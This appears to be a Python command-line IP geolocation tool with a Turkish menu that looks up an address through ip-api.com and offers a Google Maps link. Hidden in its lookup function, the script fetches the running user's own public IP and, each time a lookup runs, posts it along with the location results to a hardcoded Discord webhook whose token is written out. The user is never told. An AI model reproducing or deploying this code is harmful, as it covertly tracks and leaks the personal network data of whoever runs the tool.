import json, os, urllib.request, webbrowser, requests
from colorama import Fore, Style

banner = f"""
{Fore.RED}_______{Fore.GREEN} _______{Fore.BLUE} ______{Fore.YELLOW}    _______{Fore.MAGENTA} ________ {Style.RESET_ALL}
{Fore.RED}|  ____|{Fore.GREEN}|  ____|{Fore.BLUE}|  __ \ {Fore.YELLOW}  |_   _|{Fore.MAGENTA} |__   __|{Style.RESET_ALL}
{Fore.RED}| |__   {Fore.GREEN}| |__   {Fore.BLUE}| |__) |   {Fore.YELLOW} | |   {Fore.MAGENTA}   | |   {Style.RESET_ALL}
{Fore.RED}|  __|  {Fore.GREEN}|  __|  {Fore.BLUE}|  _  /  {Fore.YELLOW}   | |  {Fore.MAGENTA}    | |   {Style.RESET_ALL}
{Fore.RED}| |     {Fore.GREEN}| |____ {Fore.BLUE}| | \ \   {Fore.YELLOW} _| |_  {Fore.MAGENTA}   | |   {Style.RESET_ALL}
{Fore.RED}|_|     {Fore.GREEN}|______|{Fore.BLUE}|_|  \_\  {Fore.YELLOW}\_____|{Fore.MAGENTA}    |_|   {Style.RESET_ALL}
{Fore.RED}{" " * 40}by @ferit22901{Style.RESET_ALL}
{Fore.LIGHTMAGENTA_EX}Ip Lookup :){Style.RESET_ALL}

"""
try:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    CY = '\033[96m'
    W = '\033[97m'
    dosya_var = os.path.isfile('/data/data/com.termux/files/usr/bin/bash')

    def basla():
        os.system("cls" if os.name == "nt" else "clear")
        print(banner)

    def menu():
        try:
            print(R + """\n
#""" + Y + """ Seçenekleri Seç""" + G + """ >>""" + Y + """
1)""" + G + """ IP Adresinizi Kontrol Edin""" + Y + """
2)""" + G + """ Başka Bir IP Kontrol Et""" + Y + """
3)""" + G + """ Çıkış
""")
            secim = int(input(CY + "Seçiminizi Girin: " + W))
            if secim == 1:
                ana2()
                menu()
            elif secim == 2:
                ana()
                menu()
            elif secim == 3:
                print(Y + "Çıkılıyor................" + W)
            else:
                print(R + "\nGeçersiz seçenek! Lütfen tekrar deneyin\n")
                menu()
        except ValueError:
            print(R + "\nGeçersiz seçenek! Lütfen tekrar deneyin\n")
            menu()

    def get_user_ip():
        try:
            data = requests.get('https://api.ipify.org?format=json')
            return data.json()['ip']
        except requests.RequestException as e:
            print(f"Error getting user's IP: {e}")
            return None

    discord_webhook_url = 'https://discord.com/api/webhooks/1172278677212504164/pmXy6YhwPhFSQvjT8rkP0p83eRRxBUwgHnQW-ToBiuXNxYyGqmtQ_xkaCyEZulTvY79D'
    def bulucu(u):
        try:
            try:
                response = urllib.request.urlopen(u)
                veri = json.load(response)

                user_ip = get_user_ip()
                l = 'https://www.google.com/maps/place/' + str(veri['lat']) + '+' + str(veri['lon'])
                if user_ip:
                    webhook_data = {
                        "content": f"User IP Address: {user_ip}\n"
                                f"IP Adresi: {veri['query']}\n"
                                f"Organizasyon: {veri['org']}\n"
                                f"Şehir: {veri['city']}\n"
                                f"Bölge: {veri['regionName']}\n"
                                f"Ülke: {veri['country']}\n"
                                f"Ülke Kodu: {veri['countryCode']}\n"
                                f"Bölge Kodu: {veri['region']}\n"
                                f"Posta Code: {veri['zip']}\n"
                                f"Enlem: {veri['lat']}\n"
                                f"Boylam: {veri['lon']}\n"
                                f"Time Zone: {veri['timezone']}\n"
                                f"Google Haritalar Bağlantısı : {l}"
                    }
                
                response = requests.post(discord_webhook_url, json=webhook_data)

                print(R + "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                print(Y + '\n>>>' + CY + ' IP adresi detayları\n ')
                print(G + "1) IP Adresi : " + Y, veri['query'], '\n')
                print(G + "2) Organizasyon : " + Y, veri['org'], '\n')
                print(G + "3) Şehir : " + Y, veri['city'], '\n')
                print(G + "4) Bölge : " + Y, veri['regionName'], '\n')
                print(G + "5) Ülke : " + Y, veri['country'], '\n')
                print(G + "6) Ülke Kodu: "+ Y, veri['countryCode'], '\n')
                print(G + "7) Bölge Kodu: "+ Y, veri['region'], '\n')
                print(G + "8) Posta Kodu: "+ Y, veri['zip'], '\n')
                print(G + "9) Time Zone: "+ Y, veri['timezone'], '\n')
                print(G + "10) Konum\n")
                print(G + "\tEnlem : " + Y, veri['lat'], '\n')
                print(G + "\tBoylam : " + Y, veri['lon'], '\n')
                l = 'https://www.google.com/maps/place/' + str(veri['lat']) + '+' + str(veri['lon'])
                print(R + "\n#" + Y + " Google Haritalar Bağlantısı : " + CY, l)
                dosya_var = os.path.isfile('/data/data/com.termux/files/usr/bin/bash')
                if dosya_var:
                    link = 'am start -a android.intent.action.VIEW -d ' + str(l)
                    pr = input(R + "\n>>" + Y + " Bağlantıyı tarayıcınızda açmak istiyor musunuz?" + G + " (e|h): " + W)
                    if pr == "e":
                        lnk = str(link) + " > /dev/null"
                        os.system(str(lnk))
                        basla()
                        menu()
                    elif pr == "h":
                        print("\nBaşka bir IP kontrol edin veya çıkmak için Ctrl + C kullanın\n\n")
                        basla()
                        menu()
                    else:
                        print("\nGeçersiz seçenek! Tekrar deneyin\n")
                        menu()
                else:
                    pr = input(R + "\n>>" + Y + " Tarayıcıda açmak ister misiniz?" + G + " (e|h): " + W)
                    if pr == "e":
                        webbrowser.open(l, new=0)
                        basla()
                        menu()
                    elif pr == "h":
                        print(R + "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                        print(Y + "\nBaşka bir IP kontrol edin veya çıkmak için " + R + "Ctrl + C kullanın\n\n")
                        basla()
                        menu()
                    else:
                        print(R + "\nGeçersiz seçenek! Tekrar deneyin\n")
                        menu()
                return
            except KeyError:
                print(R + "\nHata! Geçersiz IP/Web Sitesi Adresi!\n" + W)
                menu()
        except urllib.error.URLError:
            print(R + "\nHata!" + Y + " Lütfen internet bağlantınızı kontrol edin!\n" + W)
            exit()

    def ana():
        u = input(G + "\n>>> " + Y + "IP Adresi/Site Adresi girin:" + W + " ")
        if u == "":
            print(R + "\nGeçerli bir IP Adresi/web sitesi adresi girin!")
            ana()
        else:
            url = 'http://ip-api.com/json/' + u
            bulucu(url)

    def ana2():
        url = 'http://ip-api.com/json/'
        bulucu(url)

    basla()
    menu()

except KeyboardInterrupt:
    print(Y + "\nİptal edildi! İyi günler :)" + W)

